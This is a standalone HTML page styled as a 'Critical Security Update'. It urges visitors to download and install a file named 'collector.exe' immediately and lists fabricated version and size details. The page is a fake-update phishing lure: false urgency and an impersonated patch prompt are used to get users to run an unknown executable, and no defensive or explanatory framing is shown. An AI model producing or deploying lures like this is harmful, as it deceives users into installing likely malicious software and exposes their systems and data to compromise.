<!DOCTYPE html>
<html>
<head>
    <title>System Security Update</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: #f5f5f5;
        }
        .box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 500px;
            margin: 0 auto;
        }
        button {
            background: #2ea44f;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background: #22863a;
        }
    </style>
</head>
<body>
    <div class="box">
        <h1>⚠️ Critical Security Update</h1>
        <p>Your system requires an urgent security patch.</p>
        <p>Download and install immediately to prevent vulnerabilities.</p>
        
        <a href="collector.exe" download>
            <button>⬇️ Download & Install Update</button>
        </a>
        
        <p style="margin-top: 30px; color: #666; font-size: 14px;">
            <strong>System requirements:</strong> Windows 10/11<br>
            <strong>Version:</strong> 2025.1 | <strong>Size:</strong> 2.4 MB
        </p>
    </div>
</body>
</html>
